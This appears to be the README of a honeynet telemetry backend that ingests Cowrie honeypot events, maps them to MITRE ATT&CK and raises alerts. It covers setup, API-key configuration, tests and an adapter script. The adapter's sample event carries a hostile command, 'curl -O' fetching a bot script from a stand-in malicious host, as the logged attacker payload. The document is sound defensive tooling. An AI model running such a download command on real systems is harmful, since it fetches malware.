# Autonomous Honeynet Telemetry Backend

FastAPI backend engine for autonomous honeynet telemetry ingestion, MITRE ATT&CK causal graph profiling, and explainable threat alerts.

---

## 📋 System Prerequisites

* **Python:** 3.10+ (Verified on Python 3.12)
* **OS:** Cross-platform (Windows, Linux, macOS)
* **Virtual Environment Tool:** `venv`

---

## 🛠 Setup & Installation

### 1. Virtual Environment Setup

From the repository root or `backend/` directory:

```bash
# Navigate to backend directory
cd backend

# Create virtual environment
python -m venv venv

# Activate virtual environment
# Windows (PowerShell):
.\venv\Scripts\Activate.ps1
# Windows (Command Prompt):
.\venv\Scripts\activate.bat
# Linux / macOS:
source venv/bin/activate
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

---

## ⚙️ Environment Configuration

Copy `.env.example` to `.env` in the `backend/` folder (or set system environment variables):

```bash
cp .env.example .env
```

### Database Configuration (`DATABASE_URL`)

* **Default Local Development (SQLite):**
  ```env
  DATABASE_URL=sqlite:///./honeynet.db
  ```
  > **Deterministic Resolution:** Regardless of which working directory you launch the backend from (project root or `backend/`), relative SQLite paths deterministically resolve to the project root `honeynet.db` file. Existing data is preserved and no split database files are created.

* **Hosted PostgreSQL (Shared Team Database):**
  ```env
  DATABASE_URL=postgresql://<db_user>:<db_password>@<db_host>:5432/<db_name>
  ```
  The engine automatically configures connection pooling (`pool_pre_ping=True`, `pool_recycle=300`) and standard ANSI migrations.

### Sensor Ingestion Security (`API_KEY`)

* **Local Development Mode:**
  Leave `API_KEY` unset or blank in `.env`. Telemetry ingestion endpoints accept incoming events without requiring headers.
* **Production / External Cowrie Mode:**
  Set a secure API key in `.env`:
  ```env
  API_KEY=your_secure_sensor_token_here
  ```
  When set, `POST /api/events` and `POST /api/events/bulk` strictly require the matching HTTP header:
  ```http
  X-API-Key: your_secure_sensor_token_here
  ```
  Missing keys receive `HTTP 401 Unauthorized`, and invalid keys receive `HTTP 403 Forbidden` (evaluated via constant-time comparison).

---

## 🚀 Running the Backend Server

Start the Uvicorn ASGI server:

```bash
# From the repository root:
python -m uvicorn app.main:app --host 127.0.0.1 --port 8000 --reload

# Or from inside the backend/ directory:
python -m uvicorn app.main:app --host 127.0.0.1 --port 8000 --reload
```

### Service URLs:
* **Health Check:** [http://127.0.0.1:8000/api/health](http://127.0.0.1:8000/api/health)
* **Interactive OpenAPI Swagger Docs:** [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)
* **Alternative ReDoc Docs:** [http://127.0.0.1:8000/redoc](http://127.0.0.1:8000/redoc)

---

## 🧪 Running Automated Tests

### 1. Isolated Unit & Functional Tests (Recommended)
Runs completely isolated in-memory tests via `pytest` without modifying or polluting the development database:

```bash
# Run all isolated tests
pytest backend/tests -v
```

### 2. Live Server Regression Tests
Runs verification scripts against the running server:

```bash
python backend/test_pipeline.py            # Ingestion, duplicates, pagination, stats
python backend/test_sessions_correlation.py # Session detection & chronological timelines
python backend/test_mitre_mapping.py        # MITRE ATT&CK technique catalog & heuristics
python backend/test_investigation_graph.py  # Cytoscape graph nodes & edges
python backend/test_explainable_alerts.py   # Explainable alerts, deduplication & status lifecycle
```

---

## 🪤 External Cowrie Honeypot Adapter Guide

An external Cowrie honeypot running on a separate virtual machine can forward events directly to this backend over HTTP/HTTPS without importing internal Python packages.

### Required & Optional Event Schema

| Field | Type | Required | Default | Description |
|---|---|---|---|---|
| `source_ip` | string | **Yes** | — | Adversary IP address observed by Cowrie |
| `event_type` | string | **Yes** | — | e.g. `auth_attempt`, `auth_failure`, `auth_success`, `command_execution`, `file_download` |
| `payload` | string | No | `null` | Executed shell command, input string, or file URL |
| `username` | string | No | `null` | Targeted username in SSH/Telnet login |
| `session_id` | string | No | `null` | Cowrie internal session ID (e.g. `c7a46e1e`) |
| `honeypot_id` | string | No | `"sensor-default"` | Name of sensor VM (e.g. `cowrie-vm-aws`) |
| `honeypot_type` | string | No | `"generic"` | Protocol or honeypot type (e.g. `ssh`, `telnet`) |
| `timestamp` | string | No | Server UTC now | ISO-8601 UTC timestamp (e.g. `2026-10-10T20:15:00Z`) |
| `source_port` | integer| No | `0` | Adversary source port |
| `destination_port`| integer| No | `0` | Targeted service port (e.g. `22` or `2222`) |
| `protocol` | string | No | `"TCP"` | Network protocol (`TCP`, `UDP`) |
| `data_origin` | string | No | `"real"` | Data label: `"real"` or `"synthetic"` |

### Example Python Adapter Script for Cowrie

```python
import json
import requests

BACKEND_URL = "http://<backend_ip>:8000/api/events"
API_KEY = "your_secure_sensor_token_here"  # Match backend API_KEY if configured

headers = {"Content-Type": "application/json"}
if API_KEY:
    headers["X-API-Key"] = API_KEY

# Example Cowrie command event
cowrie_event = {
    "source_ip": "198.51.100.85",
    "event_type": "command_execution",
    "username": "root",
    "payload": "curl -O http://malicious.org/bot.sh",
    "session_id": "cowrie-sess-98214",
    "honeypot_id": "cowrie-aws-prod-01",
    "honeypot_type": "ssh",
    "destination_port": 22,
    "timestamp": "2026-10-10T20:30:00Z",
    "data_origin": "real"
}

response = requests.post(BACKEND_URL, json=cowrie_event, headers=headers)
if response.status_code == 201:
    print(f"Event ingested successfully: {response.json()['event_id']}")
else:
    print(f"Ingestion failed ({response.status_code}): {response.text}")
```
